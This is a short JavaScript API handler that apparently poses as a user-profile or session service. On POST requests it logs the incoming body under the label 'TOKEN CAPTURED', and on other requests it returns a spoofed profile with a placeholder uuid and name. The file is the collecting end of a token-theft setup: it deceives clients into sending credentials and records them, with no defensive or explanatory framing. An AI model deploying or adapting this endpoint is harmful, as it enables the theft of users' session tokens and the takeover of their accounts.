export default function handler(req, res) {
  
  if (req.method === 'POST') {
    console.log("TOKEN CAPTURED:", req.body);
    return res.status(204).send(); 
  }

  
  return res.status(200).json({
    id: req.query.uuid || "069a79f4-44e9-4726-a5be-fca90e38aaf5",
    name: req.query.username || "Architect",
    properties: []
  });
}